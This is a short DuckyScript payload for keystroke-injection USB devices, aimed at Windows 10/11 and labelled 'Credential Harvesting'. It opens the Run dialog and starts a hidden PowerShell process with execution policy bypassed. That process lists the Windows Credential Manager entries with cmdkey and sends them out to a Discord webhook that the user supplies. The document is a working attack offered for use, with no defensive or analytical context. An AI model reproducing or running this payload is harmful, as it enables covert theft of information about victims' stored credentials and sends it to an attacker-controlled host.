REM Target: Windows 10/11
REM Category: Credential Harvesting
REM Description: Enumerates Windows Credential Manager entries and exfils to Discord
REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -W Hidden -Exec Bypass -C "$v=cmdkey /list | Out-String;$body=@{content=\"``````$($v.Substring(0,[Math]::Min(1900,$v.Length)))``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
